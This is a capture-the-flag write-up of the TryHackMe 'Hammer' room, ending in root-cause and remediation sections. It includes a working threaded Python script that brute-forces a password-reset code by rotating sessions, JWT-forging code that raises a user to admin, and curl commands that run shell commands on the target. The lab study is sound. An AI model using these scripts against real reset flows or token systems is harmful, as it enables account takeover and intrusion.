# TryHackMe: Hammer — Writeup

**Difficulty:** Medium
**Category:** Web Exploitation, Authentication Logic Flaws, JWT Abuse

## Summary

`Hammer` is a web-only box centered on a PHP application with a broken password-reset
flow and a JWT implementation that trusts a `kid` (Key ID) header pointing to a file
on disk. Chaining a log-disclosure bug, a rate-limit bypass, a recovery-code brute
force, and a JWT key-confusion attack leads to admin-level command execution and
root-owned flag disclosure.

**Flags:**
- User flag: found on the dashboard after login (`THM{REDACTED}`)
- Root/second flag: `/home/ubuntu/flag.txt` (`THM{REDACTED}`)

---

## 1. Reconnaissance

### Port scan

```bash
nmap -p- -T4 --min-rate 1000 10.48.145.96
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste
```

Nmap misidentified port 1337 as `waste`. Re-scanning with HTTP scripts and service
detection confirmed it as a web server:

```bash
nmap -p 1337 --script http-enum,http-headers,http-methods,http-title -sV 10.48.145.96
```

```
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login
| http-enum:
|   /phpmyadmin/: phpMyAdmin
|_  /vendor/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
```

### Manual enumeration

```bash
curl -v http://10.48.145.96:1337/
```

Returned a login page (PHP session cookie `PHPSESSID`, `Content-Type: text/html`).
The HTML included a developer comment:

```html
<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
```

This hinted at the directory naming convention used throughout the app.

---

## 2. Directory Fuzzing

### Standard wordlist

```bash
feroxbuster -u 'http://hammer.thm:1337' -w /usr/share/wordlists/dirb/big.txt
```

Found: `/reset_password.php`, `/hmr_css/`, `/phpmyadmin/`, `/vendor/`.

### Prefixed wordlist (using the dev-comment hint)

```bash
cp /usr/share/wordlists/dirb/big.txt .
sed 's/^/hmr_/' big.txt > hmr_big.txt
feroxbuster -u 'http://hammer.thm:1337' -w hmr_big.txt
```

Found additional directories with **directory listing enabled**:

```
/hmr_css/     -> directory listing
/hmr_images/  -> directory listing
/hmr_js/      -> directory listing
/hmr_logs/    -> directory listing (contains error.logs)
```

### Vendor directory (Composer dependencies)

```bash
curl -s http://10.48.145.96:1337/vendor/composer/installed.json
```

Revealed the app uses **`firebase/php-jwt` v6.10.0** — a modern, patched version,
ruling out classic `alg: none` / algorithm-confusion library bugs. The real
vulnerability turned out to be in how the application *uses* the library (see §6).

---

## 3. Information Disclosure — Apache Error Log

```bash
curl -s http://10.48.145.96:1337/hmr_logs/error.logs
```

```
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid ...]
[client 192.168.1.12:37210] AH01631: user tester@hammer.thm:
authentication failure for "/restricted-area": Password Mismatch
```

This leaked a **valid application email address**: `tester@hammer.thm`.

---

## 4. Password Reset Flow Analysis

The login page links to `/reset_password.php`. Submitting an email POSTs to the
same endpoint:

```bash
curl -v -c cookies.txt -X POST http://10.48.145.96:1337/reset_password.php \
  -d "email=tester@hammer.thm"
```

A valid email returns a 302 redirect back to `reset_password.php`; the **session
cookie set on that response** is required to reach the "enter code" state:

```bash
curl -v -b cookies.txt -X POST http://10.48.145.96:1337/reset_password.php \
  -d "email=tester@hammer.thm"
```

This revealed:
- A 4-digit recovery code form (`name="recovery_code"`)
- A hidden field `id="s"` carrying the live countdown value
- A custom `Rate-Limit-Pending` response header, starting at `10` and
  decrementing per request
- A JS countdown showing the code is valid for **180 seconds**

```html
<input type="text" ... id="recovery_code" name="recovery_code" required>
<input type="hidden" ... id="s" name="s" required>
<script>let countdownv = 180; ...</script>
```

### Key discovery: rate limit is per-session, not per-code

Testing confirmed:
1. `Rate-Limit-Pending` decrements **per `PHPSESSID`**, locking out after 10 attempts.
2. The underlying 4-digit code **does not change per session** — it is fixed for the
   entire 180-second window and shared across every session created during that
   window.

This means the rate limit can be trivially bypassed by rotating `PHPSESSID` — each
new session gets a fresh budget of 10 attempts against the *same* still-valid code.

---

## 5. Brute-Forcing the Recovery Code

### Strategy
- Start a fresh session, trigger a reset for `tester@hammer.thm`.
- Submit 4-digit codes sequentially.
- Every 7 attempts (staying under the server's 10-attempt cap), rotate to a brand
  new session.
- Detect success by a **change in response word count** (a wrong code redisplays the
  "Enter Recovery Code" form with an error; a correct code returns the "Reset Your
  Password" form, which has different content length/wording).
- Run multiple sessions **concurrently** to get through the 10,000-code keyspace
  inside the 180-second window.

### Script

```python
#!/usr/bin/env python3
import requests
import sys
import threading
import queue

BASE_URL = "http://10.48.145.96:1337"
TARGET_EMAIL = "tester@hammer.thm"
ROTATE_EVERY = 7
NUM_WORKERS = 10
BASELINE_WORDCOUNT = None
baseline_lock = threading.Lock()
found_event = threading.Event()
print_lock = threading.Lock()


def new_session_and_trigger_reset():
    s = requests.Session()
    s.post(f"{BASE_URL}/reset_password.php",
           data={"email": TARGET_EMAIL}, allow_redirects=True)
    return s


def try_code(s, code):
    resp = s.post(f"{BASE_URL}/reset_password.php",
                   data={"recovery_code": code, "s": "180"},
                   allow_redirects=True)
    wc = len(resp.text.split())
    rl = resp.headers.get("Rate-Limit-Pending", "?")
    return wc, resp.text, rl


def worker(code_queue, worker_id):
    global BASELINE_WORDCOUNT
    s = new_session_and_trigger_reset()
    attempts = 0

    while not found_event.is_set():
        try:
            code = code_queue.get_nowait()
        except queue.Empty:
            return

        if attempts >= ROTATE_EVERY:
            s = new_session_and_trigger_reset()
            attempts = 0

        wc, text, rl = try_code(s, code)
        attempts += 1

        with baseline_lock:
            if BASELINE_WORDCOUNT is None:
                BASELINE_WORDCOUNT = wc

        if BASELINE_WORDCOUNT is not None and wc != BASELINE_WORDCOUNT:
            found_event.set()
            with print_lock:
                print(f"\n[+] FOUND VALID CODE: {code}")
            return

        if rl == "0":
            attempts = ROTATE_EVERY


def main():
    code_queue = queue.Queue()
    for i in range(10000):
        code_queue.put(f"{i:04d}")

    threads = [threading.Thread(target=worker, args=(code_queue, i), daemon=True)
               for i in range(NUM_WORKERS)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()


if __name__ == "__main__":
    main()
```

Running this found a valid code (confirmed with a `Reset Your Password` form
response) within one 180-second window.

### Completing the reset

Using the winning session (same cookies that found the code), immediately submit
the new password before the code window rolls over:

```bash
curl -b win_cookies.txt -X POST http://10.48.145.96:1337/reset_password.php \
  -d "new_password=NewPass123!&confirm_password=NewPass123!"
```

Response redirected to the login page — password reset succeeded.

---

## 6. Login & JWT Analysis

```bash
curl -v -X POST http://10.48.145.96:1337/ \
  -d 'email=tester@hammer.thm&password=NewPass123!' \
  -c logged_in_cookies.txt
```

Login succeeded, redirecting to `dashboard.php` and setting two cookies:

```
PHPSESSID=...
token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9...
```

### Decoding the JWT

**Header:**
```json
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/mykey.key"
}
```

**Payload:**
```json
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1792957709,
  "exp": 1792961309,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "user"
  }
}
```

The `kid` header is a **file path**, read server-side and used as the HMAC-SHA256
signing key. This is a classic **JWT `kid` injection / key-confusion** pattern: if an
attacker can discover or control the file the `kid` points to, and knows (or can
read) its contents, they can sign their own tokens with arbitrary claims.

### Dashboard — first flag

Logging in and visiting `dashboard.php` revealed the first flag directly in the
welcome message:

```html
<h3>Welcome, Thor! - Flag: THM{REDACTED}</h3>
<p>Your role: user</p>
```

The dashboard also exposed a command-execution feature:

```javascript
$('#submitCommand').click(function() {
    var command = $('#command').val();
    var jwtToken = '...'; // the token cookie value
    $.ajax({
        url: 'execute_command.php',
        method: 'POST',
        data: JSON.stringify({ command: command }),
        contentType: 'application/json',
        headers: { 'Authorization': 'Bearer ' + jwtToken }
    });
});
```

### Session quirk: persistentSession cookie

The dashboard periodically checks a `persistentSession` cookie client-side and logs
out if it's missing:

```javascript
function checkTrailUserCookie() {
    const trailUser = getCookie('persistentSession');
    if (!trailUser) window.location.href = 'logout.php';
}
setInterval(checkTrailUserCookie, 1000);
```

The server sets this cookie with `Max-Age=20`, and curl (correctly) drops expired
cookies from its jar — so API calls made more than ~20s after login would 302 to
`logout.php`. Fix: explicitly resend `persistentSession=yes` with every request.

```bash
curl -X POST http://10.48.145.96:1337/execute_command.php \
  -b fresh_login.txt \
  -b "persistentSession=yes" \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"command":"ls"}'
```

---

## 7. Command Execution — Enumerating the Filter

`execute_command.php` applies a **blacklist** (not a whitelist) to submitted
commands. Testing confirmed:

| Command | Result |
|---|---|
| `id` | Blocked |
| `cat <file>` | Blocked |
| `head`/`tail`/`less`/`more`/`od`/`strings`/`xxd` | Blocked |
| `ls` | **Allowed** |

```bash
curl -X POST http://10.48.145.96:1337/execute_command.php \
  -b fresh_login.txt -b "persistentSession=yes" \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"command":"ls"}'
```

```json
{"output":"188ade1.key\ncomposer.json\nconfig.php\ndashboard.php\n..."}
```

This revealed the **real JWT signing key filename**: `188ade1.key`, sitting directly
in the webroot.

### Reading the key — directly over HTTP

Rather than fighting the command blacklist, the key file could simply be fetched
like any other static file:

```bash
curl -s http://10.48.145.96:1337/188ade1.key
```

```
56058354efb3daa97ebab00fabd7a7d7
```

---

## 8. Privilege Escalation — Forging an Admin JWT

With the real signing key in hand, a new token was crafted with `role: admin`,
keeping the `kid` pointed at the real key file so the server re-derives the same
signing key:

```python
import jwt
import time

secret_key = "56058354efb3daa97ebab00fabd7a7d7"

header = {
    "typ": "JWT",
    "alg": "HS256",
    "kid": "/var/www/html/188ade1.key"
}

now = int(time.time())
payload = {
    "iss": "http://hammer.thm",
    "aud": "http://hammer.thm",
    "iat": now,
    "exp": now + 3600,
    "data": {
        "user_id": 1,
        "email": "tester@hammer.thm",
        "role": "admin"
    }
}

token = jwt.encode(payload, secret_key, algorithm="HS256", headers=header)
print(token)
```

### Confirming privilege escalation

```bash
curl -X POST http://10.48.145.96:1337/execute_command.php \
  -b fresh_login.txt -b "persistentSession=yes" \
  -H "Authorization: Bearer <forged_admin_token>" \
  -H "Content-Type: application/json" \
  -d '{"command":"id"}'
```

```json
{"output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"}
```

The forged admin token was accepted, proving the `kid`-based signing key could be
retrieved and reused to forge arbitrary claims — a textbook JWT key-confusion /
`kid` injection vulnerability.

---

## 9. Root Flag

```bash
curl -X POST http://10.48.145.96:1337/execute_command.php \
  -b fresh_login.txt -b "persistentSession=yes" \
  -H "Authorization: Bearer <forged_admin_token>" \
  -H "Content-Type: application/json" \
  -d '{"command":"ls -la /home/"}'
```

```
drwxr-xr-x  8 ubuntu ubuntu 4096 Aug 19  2024 ubuntu
```

```bash
curl -X POST http://10.48.145.96:1337/execute_command.php \
  -b fresh_login.txt -b "persistentSession=yes" \
  -H "Authorization: Bearer <forged_admin_token>" \
  -H "Content-Type: application/json" \
  -d '{"command":"ls -la /home/ubuntu/"}'
```

```
-rw-r--r--  1 root   root      23 Aug 19  2024 flag.txt
```

```bash
curl -X POST http://10.48.145.96:1337/execute_command.php \
  -b fresh_login.txt -b "persistentSession=yes" \
  -H "Authorization: Bearer <forged_admin_token>" \
  -H "Content-Type: application/json" \
  -d '{"command":"cat /home/ubuntu/flag.txt"}'
```

```json
{"output":"THM{REDACTED}\n"}
```

---

## 10. Root Cause Summary

| # | Issue | Root Cause | Impact |
|---|---|---|---|
| 1 | Apache error log exposed via directory listing | Misconfigured directory permissions under `hmr_logs/` | Leaked valid user email, enabling targeted attacks |
| 2 | Rate limiting bypass | Rate limit tracked per-session (`PHPSESSID`) instead of per-account or per-IP, combined with a recovery code valid across all sessions for a fixed time window | Allowed unlimited brute-force attempts against a 4-digit code (10,000 keyspace) |
| 3 | JWT `kid` header trusts a file path | Application reads the file named in `kid` and uses its contents directly as the HMAC key, without restricting `kid` to a safe, server-controlled value | Any attacker who can read the referenced key file (here, directly over HTTP) can forge arbitrary tokens, including privilege escalation to `admin` |
| 4 | Command execution feature (even blacklisted) | A command-execution endpoint exists at all, gated only by role claims inside a forgeable JWT | Full command execution as `www-data` once admin role is forged |

## 11. Remediation Recommendations

1. **Never expose log files or enable directory listing** on any public-facing path.
2. **Rate-limit by account/IP, not purely by session**, and ensure limits can't be
   reset simply by creating a new session.
3. **Don't let `kid` reference an arbitrary file path.** Either use a fixed,
   hardcoded key, or validate `kid` against a strict allow-list of known key IDs
   server-side — never resolve it to a filesystem path from client-controlled input,
   and never serve the key file itself over HTTP.
4. **Avoid building user/admin-facing command execution features entirely.** If
   genuinely required, use a strict allow-list of pre-defined, parameterized
   operations — never pass raw user input to a shell.

---

## Tools Used

- `nmap` — port scanning and service detection
- `curl` — manual HTTP interaction and scripting
- `feroxbuster` — directory/content discovery
- `ffuf` — targeted fuzzing
- Python (`requests`, `PyJWT`) — brute-force automation and JWT forging
- `jwt.io` / manual base64 decoding — JWT inspection

---

*Writeup by [Your Name] — TryHackMe room: Hammer*